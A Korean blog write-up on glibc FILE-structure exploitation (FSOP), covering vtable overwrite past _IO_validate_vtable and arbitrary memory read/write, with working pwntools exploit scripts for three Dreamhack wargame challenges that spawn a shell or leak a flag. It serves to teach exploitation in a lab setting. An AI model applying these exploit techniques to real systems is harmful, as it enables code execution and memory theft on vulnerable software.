---
tistoryBlogName: k0n9
tistoryTitle: FSOP
tistoryVisibility: "3"
tistoryCategory: "1136867"
tistorySkipModal: true
tistoryPostId: "42"
tistoryPostUrl: https://k0n9.tistory.com/42
---
file stream oriented programming
## \_IO_FILE 이란?

리눅스 시스템의 표준 라이브러리에서 파일 스트림을 나타내기 위한 구조체, fopen(), fwrite(), fclose() 등 파일 스트림을 사용하는 함수가 호출되었을때 할당

#### 구조체

```c
struct _IO_FILE
{
int _flags;		/* High-order word is _IO_MAGIC; rest is flags. */
/* The following pointers correspond to the C++ streambuf protocol. */
char *_IO_read_ptr;	/* Current read pointer */
char *_IO_read_end;	/* End of get area. */
char *_IO_read_base;	/* Start of putback+get area. */
char *_IO_write_base;	/* Start of put area. */
char *_IO_write_ptr;	/* Current put pointer. */
char *_IO_write_end;	/* End of put area. */
char *_IO_buf_base;	/* Start of reserve area. */
char *_IO_buf_end;	/* End of reserve area. */
/* The following fields are used to support backing up and undo. */
char *_IO_save_base; /* Pointer to start of non-current get area. */
char *_IO_backup_base;  /* Pointer to first valid character of backup area */
char *_IO_save_end; /* Pointer to end of non-current get area. */
struct _IO_marker *_markers;
struct _IO_FILE *_chain;

int _fileno;    // 둘이 같이해서
int _flags2;    // 8바이트 임

__off_t _old_offset; /* This used to be _offset but it's too small.  */
/* 1+column number of pbase(); 0 is unknown. */

unsigned short _cur_column;  // 셋이
signed char _vtable_offset;  // 같이해서
char _shortbuf[1];           // 8바이트임

_IO_lock_t *_lock;
#ifdef _IO_USE_OLD_IO_FILE
};
//나머지는 모두 멤버 하나당 8바이트
struct _IO_FILE_plus
{
  _IO_FILE file;
  const struct _IO_jump_t *vtable;
};
```

int \_flags : 파일에 대한 읽기/쓰기/추가 권한을 의미한다. 0xfbad0000가 매직값(magic number)이며 하위 2바이트는 여러 플래그들이다. 플래그는 /libio/libio.h 에 정의되어있다.

char \*\_IO_read_ptr : 읽기를 처리할 위치를 가리키는 포인터

char \*\_IO_read_end: 읽을 데이터가 있는 영역의 끝을 가리키는 포인터, EOF라고 보면 됨

char \*\_IO_read_base: 읽고 있는 데이터의 시작을 가리키는 포인터

char \*\_IO_write_base: 데이터를 쓸 영역의 시작 위치를 가리키는 포인터

char \*\_IO_write_ptr : 현재 데이터를 쓸 곳을 가리키는 포인터

char \*\_IO_write_end : 데이터를 쓸 영역의 끝을 가리키는 포인터

char \*\_IO_buf_base : 버퍼의 시작 주소를 가리킨다.

char \*\_IO_buf_end : 버퍼의 끝 주소를 가리킨다.

\_chain : \_IO_FILE 에 대한 Linked List 형성을 위해 사용되는 _IO_FILE 포인터, Linked List 의 Header 는 _IO_list_all 에 저장

\_fileno : 파일 디스크립터 값(디스크립터 : 시스템으로 부터 할당받은 파일이나 소켓을 대표하는 정수)

기타 등등.. 

#### 예시
```c
#include <stdio.h>
int main()
{
	char file_data[256];
	int ret;
	FILE *fp;
	
	strcpy(file_data, "AAAA");
	fp = fopen("testfile","r");
	fread(file_data, 1, 256, fp);
	printf("%s",file_data);
	fclose(fp);
}
```

위 코드를 실행해보자.
![](https://i.imgur.com/ePwGrnr.png)
malloc후에 rax보면 heap주소가 있다.
![](https://i.imgur.com/nfuZBkF.png)
fopen후에 없던 heap영역이 생기고 \_IO_FILE 구조체가 할당된다.(표준 스트림인 stdin, stdout, stderr는 기본으로 할당됨)
![](https://i.imgur.com/KWTGqJw.png)

![](https://i.imgur.com/SoIS7jN.png)
위 구조체는 \_IO_FILE_plus 구조체이다. 이는 \_IO_FILE 구조체에 함수 인터 테이블을 가리키는 포인터를 추가한 구조체이다.

(\_flag에 -72539000 을 16진수로 하면 fbad 2488임) 그리고 정상적으로 처리된다면 \_IO_FILE_plus를 반환한다. 

정상적으로 처리되지 않아 File open 실패시 \_IO_un_link 후에 malloc했던 것을 free한다.

![](https://i.imgur.com/ChetcGe.png)


```c
struct _IO_FILE_plus
{
  _IO_FILE file;
  const struct _IO_jump_t *vtable;
};
```

그리고 vtable에 있는 함수 포인터를 호출하게 된다. 그리고 vtable은 파일 포인터 내에 존재하기 때문에 vtable을 가리키는 주소를 바꾸거나 값을 조작할 수 있다. 

### 버전차이

glibc 2.24 이상 버전부터 \_IO_validate_vtable() 로 vtable을 검사한다. (vtable의 주소가 섹션의 크기를 벗어나면 에러 발생)이 때문에 vtable 값을 공격자가 원하는 함수의 주소로 overwrite할 수 없다. 왜냐하면 \_IO_validate_vtable()함수가 \_libc_IO_vtables의 섹션 크기를 계산한 후 파일 함수가 호출될 때 참조하는 vtable주소가 \_libc_IO_vtables 영역에 존재하는지 검증하고 vtable의 주소가 \_libc_IO_vtables 영역에 존재하지 않으면 \_IO_vtable_check 함수를 호출하여 포인터를 추가로 확인한다. 그래서 \_IO_vtable_check 섹션에 존재하는 함수들 중 공격에 유용한 함수를 사용해야 한다.

## FSOP(vtable overwrite)

\_IO_validate_vtable() 때문에 \_libc_IO_vtables 섹션에 존재하는 함수들 중 공격에 사용될 수 있는 함수를 찾아야 한다. 그 중에 \_IO_str_jumps안의 함수인 \_IO_str_overflow를 사용할 수 있다.

\_IO_str_overflow 함수를 봐보자(v2.27).

```c
#define _IO_blen(fp) ((fp)->_IO_buf_end - (fp)->_IO_buf_base)

int
_IO_str_overflow (_IO_FILE *fp, int c)
{
  intflush_only = c ==EOF;
_IO_size_tpos;
  if (fp->_flags &_IO_NO_WRITES)
      returnflush_only ? 0 :EOF;
  if ((fp->_flags &_IO_TIED_PUT_GET) && !(fp->_flags &_IO_CURRENTLY_PUTTING))
    {
fp->_flags |=_IO_CURRENTLY_PUTTING;
fp->_IO_write_ptr =fp->_IO_read_ptr;
fp->_IO_read_ptr =fp->_IO_read_end;
    }
pos =fp->_IO_write_ptr -fp->_IO_write_base;
  if (pos >= (_IO_size_t) (_IO_blen (fp) +flush_only))
    {
      if (fp->_flags &_IO_USER_BUF)/* not allowed to enlarge */returnEOF;
      else
	{
	  char *new_buf;
	  char *old_buf =fp->_IO_buf_base;
size_t old_blen =_IO_blen (fp);
_IO_size_tnew_size = 2 * old_blen + 100;
	  if (new_size < old_blen)
	    returnEOF;
new_buf= (char *) (*((_IO_strfile *)fp)->_s._allocate_buffer) (new_size);
	  if (new_buf == NULL)
	    {
/*	  __ferror(fp) = 1; */returnEOF;
	    }
	  if (old_buf)
	    {
memcpy (new_buf,old_buf, old_blen);
	      (*((_IO_strfile *)fp)->_s._free_buffer) (old_buf);
/* Make sure _IO_setb won't try to delete _IO_buf_base. */fp->_IO_buf_base = NULL;
	    }
memset (new_buf + old_blen, '\\0',new_size - old_blen);

_IO_setb (fp,new_buf,new_buf +new_size, 1);
fp->_IO_read_base =new_buf + (fp->_IO_read_base -old_buf);
fp->_IO_read_ptr =new_buf + (fp->_IO_read_ptr -old_buf);
fp->_IO_read_end =new_buf + (fp->_IO_read_end -old_buf);
fp->_IO_write_ptr =new_buf + (fp->_IO_write_ptr -old_buf);

fp->_IO_write_base =new_buf;
fp->_IO_write_end =fp->_IO_buf_end;
	}
    }

  if (!flush_only)
    *fp->_IO_write_ptr++ = (unsigned char) c;
  if (fp->_IO_write_ptr >fp->_IO_read_end)
fp->_IO_read_end =fp->_IO_write_ptr;
  return c;
}
```

여기서 우리가 집중해야 할 곳은

```c
new_buf= (char *) (*((_IO_strfile *)fp)->_s._allocate_buffer) (new_size);
```

이 부분이다. \_s.\_allocate_buffer는 함수포인터이기에 이것을 덮어쓰고 new_size가 인자이니 이것을 조작하면 된다. (fp→_s.\_allocate_buffer는 vtable주소가 위치한 다음 8바이트를 의미한다.)

이 방법을 하기 위해서는 몇개의 조건을 충족시켜야 하는 부분이 있다.

우선 이 부분이다.

```c
if (pos >= (_IO_size_t) (_IO_blen (fp) + flush_only))
```



```c
intflush_only = c ==EOF;
```

flush_only의 초기값은 0이니 결국 이렇게 된다

```c
if (pos >= (_IO_size_t) (_IO_blen (fp)))
```

우선 pos와 \_IO_blen(fp)는 이렇게 정해진다.

```c
pos = fp->_IO_write_ptr - fp->_IO_write_base

#define _IO_blen(fp) ((fp)->_IO_buf_end - (fp)->_IO_buf_base)
```

\_IO_write_base 를 0으로 하고 _IO_write_ptr 을 적당한 값으로 하고 _IO_buf_base를 0으로 하고 _IO_buf_end를 적당한 값으로 하여 pos_IO_blen(fp)보다 pos를 크거나 같 한다.

그 다음 new_size의 인자값을 조작하자. new_size는 이렇게 정해진다.

```c
size_t old_blen =_IO_blen (fp);
_IO_size_t new_size = 2 * old_blen + 100;
	  if (new_size < old_blen)
	    returnEOF;
```

\_IO_buf_end 는 (원하는 값 - 100)/2 를 입력

\_IO_buf_base 는 0을 입력한다.

그러면 다 끝났다.

fclose 함수가 호출하는 \_IO_new_fclose 함수 내부에서는 _IO_FINISH 함수가 호출된다. 이때 _IO_FINISH 함수는 _IO_jump+0x10 에 존재한다. 그러니 fclose에서 vtable에는 _IO_jump가 있을것이고 vtable + 0x10을 참조하여 _IO_FINISH를 호출할 것이다. 그러니 vtable에 _IO_str_overflow - 0x10 값을 넣으면 된다.

\_IO_write_ptr과 _IO_buf_end 등등의 값을 변조하여 new_size가 “/bin/sh”의 문자열을 가르키게 하고 마지막에 _s._allocate_buffer에 system함수를 넣어 결과적으로 system(”/bin/sh”)가 된다.

그리고 fclose에서 lock 이 인자로 여러군데 쓰이는데 중간중간에 맞춰줘야 할 조건이 있는데 lock이 가리키는 곳은 쓰기 가능 영역이야하고 0x0이여야 한다는 조건이 있다.

\_IO_file_jumps에 0xd8을 하는 이유는 _IO_file_jumps 와 _IO_str_overflow까지의 오프셋을 구하는 방법이 _IO_file_jumps 와 _IO_str_jumps 까지의 거리를 구하고 _IO_str_jumps와 _IO_str_overflow까지의 거리를 더해서 구하기 때문이다.

## 정리

\_IO_buf_end : (원하는 값 - 100)/2

\_IO_buf_base : 0

\_IO_write_ptr = _IO_buf_end

\_IO_write_base = 0

lock = 쓰기 가능 영역이며 0x0인 주소

vtable : \_IO_str_overflow - 0x10

### 예제_dreamhack-bypass_valid_vtable
c코드

```c
#include <stdio.h>
#include <unistd.h>
FILE *fp;
void init() {
setvbuf(stdin, 0, 2, 0);
setvbuf(stdout, 0, 2, 0);
}
int main() {
   init();
   fp = fopen("/dev/urandom", "r");

   printf("stdout: %p\\n", stdout);
   printf("Data: ");
   read(0, fp, 300);
   fclose(fp);
}

```

보호기법 체크

![](https://i.imgur.com/Fq9xSdb.png)

stdout 주소를 알려줌

![](https://i.imgur.com/9Tvp1d0.png)
fp를 참조하여 입력하 vtable overwrite를 알 수 있다.

익스코드

```python
from pwn import *
e = ELF("./libc.so.6")
e1 = ELF("./bypass_valid_vtable")
p = remote("host3.dreamhack.games", 16116)
p.recvuntil("stdout: 0x")
stdout = int(p.recv(12), 16)
libc_base = stdout - e.symbols["_IO_2_1_stdout_"]
io_file_jumps = libc_base + e.symbols['_IO_file_jumps']
io_str_overflow = io_file_jumps + 0xd8
io_str = libc_base + e.symbols['_IO_file_overflow']
system = libc_base + e.symbols["system"]
fp = e1.symbols['fp']
binsh_off = next(e.search(b"/bin/sh"))
binsh = libc_base + binsh_off
buf_end = (binsh - 100) // 2
vtable = io_str_overflow - 0x10
ex = p64(0x0) #flag
ex += p64(0x0) #read_ptr
ex += p64(0x0) #read_end
ex += p64(0x0) #read_base
ex += p64(0x0) #write_base
ex += p64(buf_end) #write_ptr
ex += p64(0x0) #write_end
ex += p64(0x0) #buf_base
ex += p64(buf_end) #buf_end
ex += p64(0x0) #save_base
ex += p64(0x0) #backup_base
ex += p64(0x0) #save_end
ex += p64(0x0) #marker
ex += p64(0x0) #chain
ex += p64(0x0) #fileno + flags2
ex += p64(0x0) #old_offset
ex += p64(0x0) #_cur_column + _vtable_offset + _shortbuf
ex += p64(fp + 0x10) #lock
ex += p64(0x0) * 0x9
ex += p64(vtable) #vtable
ex += p64(system)
p.sendlineafter("Data: ", ex)
p.interactive()
```

우선 기본적으로 주는 stdout으로 libc_base를 구한다. 그리고 base를 구했으니 io_file_jumps, system, /bin/sh 주소를 구한다. 그리고 io_file_jumps를 구했으니 io_str_overflow주소도 알아낸다. 그리고 fp주소도 알아낸다. 그리고 buf_end에 입력할 값으로 /bin/sh 문자열에 100을 빼고 2로 나눈다. vtable에 입력할 값으로 io_str_overflow - 0x10을 해준다. 차례대로 입력하면 끝이다.

![](https://i.imgur.com/eORnZcn.png)


## FSOP(read, write)

### FSOP read

우선 파일 쓰기 과정을 알아보자.

파일에 데이터를 쓰는 함수는 대표적으로 fwrite, fputs 가 있다.
해당 함수는 라이브러리 내부에서 \_IO_sputn 함수를 호출한다.
![](https://i.imgur.com/Mp4KwDO.png)
그리고 실질적으로 \_IO_new_file_xsputn 함수를 실행한다.

![](https://i.imgur.com/v7nkSDV.png)
이 함수에서는 파일 함수로 전달된 인자인 데이터와 길이를 검사하고 \_IO_new_file_overflow함수를 호출한다.

![](https://i.imgur.com/b55WKke.png)
![](https://i.imgur.com/ATwuJOL.png)


![](https://i.imgur.com/BEnWC2e.png)

결국 \_IO_file_overflow가 호출되고 \_IO_new_file_overflow가 호출됨
![](https://i.imgur.com/9BhVcrz.png)

\_IO_new_file_overflow 함수내부에서는 \_flags 변수에 쓰기 권한이 부여되었는지 확인하고 함수의 인자인 ch = EOF = -1 이면 \_IO_do_write 함수를 호출한다. 전달되는 인자로는 파일 구조체의 멤버 변수를 전달한다.
![](https://i.imgur.com/3WjJA1f.png)
\_IO_do_write 함수는 내부적으로 new_do_write 함수를 호출한다.

![](https://i.imgur.com/2jpm6jC.png)

new_do_write 함수에서는 \_flags 변수에 \_IO_IS_APPENDING 플래그가 포함되어있는지 확인한다. 그리고 new_do_write 함수의 인인 파일 포인터와 data, to_do 를 인자로 \_IO_SYSWRITE 함수를 호출하고 이는 곧 vtable의 \_IO_new_file_write함수이다.

![](https://i.imgur.com/axfglU3.png)

결국 \_IO_file_write를 호출하고 \_IO_new_file_write가 호출됨.
![](https://i.imgur.com/sdbTTow.png)

\_IO_new_file_write 함수 내부에서는 write 시스템 콜을 사용해 파일에 데이터를 작성한다. 시스템 콜의 인자로는 파일구조체의 \_fileno, \_IO_write_base 인 data, \_IO_write_ptr - \_IO_write_base 로 연산된 to_do 변수가 전달된다.

![](https://i.imgur.com/Uhia5iZ.png)

전달되는 인자를 파일 구조체로 보면 이렇다. write(f->\_fileno, \_IO_write_base, \_IO_write_ptr - \_IO_write_base);

그래서 이 인자들을 조작하면 임의의 주소 등을 읽을 수 있다.

아무튼 fwrite는 결과적으로 이런 함수가 실행된다는 것이다.
```
write(f->_fileno, _IO_write_base, _IO_write_ptr - _IO_write_base);
```
이 인자들을 조작하면 임의의 주소 등을 읽을 수 있다.

1. 임의의 주소를 읽기 위해서 필요한 권한은 0x800이니 \_flags에 매직값인 0xfbad0000과 0x800을 포함한 값으로 덮는다. (만약 첫번째 if도 우회하고 싶으면 0x1000도 더해준다. 이러면 3번 과정을 안해도 된다.)
    
2. 첫번째 인자 : \_fileno는 화면에 출력해야 하니 1로 한다.
    
    두번째 인자 : \_IO_write_base는 읽을 buf의 주소로 한다.
    
    세번째 인자 : 읽고 싶은 바이트 만큼 적는다. 만약 1024바이트를 읽고싶으면 \_IO_write_ptr - \_IO_write_base = 1024 여야 하니 \_IO_write_ptr을 읽을 buf의 주소 + 1024로 덮는다. 그러면 결과적으로 세번째 인자에 1024가 들어갈 것이다.
    
3. new_do_write 함수 내에서 lseek 시스템 콜이 호출되지 않도록 하기 위해 \_IO_read_end 포인터를 읽을 buf의 주소로 조작한다.

	![](https://i.imgur.com/nJRrckJ.png)

	그러면 결과적으로는 write(1, buf, 1024) 가 실행이 된다.


### dreamhack.io : \_IO_FILE Arbitrary Address Read

c코드

```c
#include <stdio.h>
#include <unistd.h>
#include <string.h>
char flag_buf[1024];
FILE *fp;
void init() {
  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);
}
int read_flag() {
	FILE *fp;
	fp = fopen("/home/iofile_aar/flag", "r");
	fread(flag_buf, sizeof(char), sizeof(flag_buf), fp);
	fclose(fp);
}
int main() {
  const char *data = "TEST FILE!";
  init();
  read_flag();
  fp = fopen("/tmp/testfile", "w");
  printf("Data: ");
  read(0, fp, 300);
  fwrite(data, sizeof(char), sizeof(flag_buf), fp);
  fclose(fp);
}
```

flag_buf의 값을 읽으면 된다.

익스코드

```python
from pwn import *

libc = ELF("./libc.so.6")
r = remote("host3.dreamhack.games", 9448)
p = ELF("./iofile_aar")

flags = 0xfbad0000 + 0x800
fileno = 0x1
write_base = p.symbols['flag_buf']
write_ptr  = write_base + 1024
read_end = write_base

ex  = p64(flags)   #flag
ex += p64(0x0)  #read_ptr
ex += p64(read_end)  #read_end
ex += p64(0x0)  #read_base

ex += p64(write_base)  #write_base
ex += p64(write_ptr)  #write_ptr

ex += p64(0x0)  #write_end

ex += p64(0x0)  #buf_base
ex += p64(0x0)  #buf_end

ex += p64(0x0)  #save_base
ex += p64(0x0)  #backup_base
ex += p64(0x0)  #save_end
ex += p64(0x0)  #marker
ex += p64(0x0)  #chain
ex += p64(0x1)  #fileno

r.sendlineafter("Data: ", ex)
r.interactive()
```

간단한 거니 따로 설명은 안하겠다.
![](https://i.imgur.com/ilTcQOs.png)

### FSOP write

파일 읽기의 함수는 대표적으로 fread, fgets가 있다.

해당 함수는 라이브러리 내부에서 \_IO_file_xsgetn 함수를 호출한다.

![](https://i.imgur.com/zJSrzBU.png)
![](https://i.imgur.com/ogKo3qI.png)

![](https://i.imgur.com/lN6wVDw.png)

해당 함수에서 파일 함수의 인자로 전달된 n(읽어들일 데이터의 최대크기)이 \_IO_buf_end - \_IO_buf_base 값보다 작은지 검사하고 \_\_underflow즉, \_IO_new_file_underflow 함수를 호출한다.(그래서 나중에 \_IO_buf_end를 \_IO_buf_base+1024보다 크게 하는 것임)

![](https://i.imgur.com/jd1d5Hq.png)
![](https://i.imgur.com/EzCMCmK.png)

![](https://i.imgur.com/0J0vc7k.png)

![](https://i.imgur.com/dbYEeCs.png)

![](https://i.imgur.com/OE5h36g.png)

![](https://i.imgur.com/EYYrVWe.png)

\_IO_new_file_underflow 함수를 보면 해당 함수에서는 \_flags에 읽기 권한이 부여되어 있는지 확인한다.

![](https://i.imgur.com/xXKZjA1.png)
![](https://i.imgur.com/xab92un.png)

그리고 \_IO_SYSREAD 함수의 인자로 파일 포인터와 파일 구조체의 멤버 변수를 연산한 값이 전달된다. \_IO_SYSREAD는 \_IO_file_read함수로 매크로로 정의되있다.

![](https://i.imgur.com/f2Y1Vuq.png)

![](https://i.imgur.com/H3AQajB.png)

![](https://i.imgur.com/6NqrJb7.png)

\_IO_file_read 함수 내부에서는 read 시스템 콜을 한다. 인자로는 \_fileno인 파일 디스크립터, IO_buf_base인 buf, \_IO_buf_end - \_IO_buf_base 로 연산된 size 변수가 전달된다.

![](https://i.imgur.com/dBMs488.png)

read(f->_fileno, _IO_buf_base, _IO_buf_end - _IO_buf_base);

이 인자들을 조작하면 임의의 주소 등에 어떤값을 입력할 수 있다.

fread는 결과적으로 이런 함수가 실행된다.

```
read(f->_fileno, _IO_buf_base, _IO_buf_end - _IO_buf_base);
```

이 인자들을 조작하면 임의의 주소에 값을 입력할 수 있다.

1. flags는 매직값인 0xfbad0000 에 0x2488을 더한값을 넣는다.
    
2. 첫 번째 인자 : 파일 디스크립터는 표준 입력인 0으로 한다.
    
    두 번째 인자 : \_IO_buf_base는 쓰고싶은 buf 의 주소로 조작한다.
    
    세 번째 인자 : \_IO_buf_end 는 쓰고싶은 buf 의 주소 + 1024 보다 크거나 같은 수를 더한 값으로 조작한다.
    
    1024보다 큰 숫자를 더하는 이유는, \_IO_new_file_underflow(아니 내가봤을때는 \_IO_file_xsgetn인데 드림핵은 저렇게 나옴) 코드 내에서 \_IO_buf_end - \_IO_buf_base 값이 fread 함수의 인자로 전달된 읽을 크기(buf의 크기) 보다 커야하는 조건이 있기 때문이다. 이러한 이유는 fread에서 읽어들일 데이터가 요청한 크기보다 작아서 읽기를 중단하는 경우 등이 있을 수 있습니다. 이러한 경우에도 fread 함수는 요청한 데이터 크기만큼 반환값을 반환하기 때문에, 실제로 읽어들인 데이터 크기보다 큰 값을 반환하게 된다.
    

그러면 결과적으로 read(0, buf, 1024+) 가 실행이 된다.

### 예제_dreamhack.io : \_IO_FILE Arbitary Address Write
c코드

```c
#include <stdio.h>
#include <unistd.h>
#include <string.h>

char flag_buf[1024];
int overwrite_me;

void init() {
  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);
}

int read_flag() {
	FILE *fp;
	fp = fopen("/home/iofile_aaw/flag", "r");
	fread(flag_buf, sizeof(char), sizeof(flag_buf), fp);

	write(1, flag_buf, sizeof(flag_buf));
	fclose(fp);
}

int main() {
  FILE *fp;

  char file_buf[1024];

  init();

  fp = fopen("/etc/issue", "r");

  printf("Data: ");

  read(0, fp, 300);

  fread(file_buf, 1, sizeof(file_buf)-1, fp);

  printf("%s", file_buf);

  if( overwrite_me == 0xDEADBEEF) 
  	read_flag();

  fclose(fp);
}
```

익스코드

```python
from pwn import *

context.log_level = 'debug'

e = ELF("./iofile_aaw")
r = remote("host3.dreamhack.games", 14573)
# r = process("./iofile_aaw")

buf = e.symbols['overwrite_me']
flags = 0xfbad2248
buf_base = buf
buf_end = buf+1024

# pause()

ex  = p64(flags)   #flag
ex += p64(0x0)  #read_ptr
ex += p64(0x0)  #read_end
ex += p64(0x0)  #read_base
ex += p64(0x0)  #write_base
ex += p64(0x0)  #write_ptr
ex += p64(0x0)  #write_end

ex += p64(buf_base)  #buf_base
ex += p64(buf_end)  #buf_end

ex += p64(0x0)  #save_base
ex += p64(0x0)  #backup_base
ex += p64(0x0)  #save_end
ex += p64(0x0)  #marker
ex += p64(0x0)  #chain
ex += p64(0x0)  #fileno

r.sendlineafter("Data: ", ex)
sleep(1)
r.sendline(p64(0xdeadbeef)+ b"\x00"*1024)
# 마지막에 "\x00"*1024가 붙는 이유는 우리가 read3번째
# 인자에 1024만큼 했기 때문에 1024개를 받지 못하면
# EOF를 전달되지 않아 계속 입력을 받게 된다. 그래서 
# read 의 3번째 인자보다 같거나 더 많은 값을 입력해야 한다.
r.interactive()
```

간단한 거니 따로 설명은 안하겠다.

![](https://i.imgur.com/QhdhU2q.png)
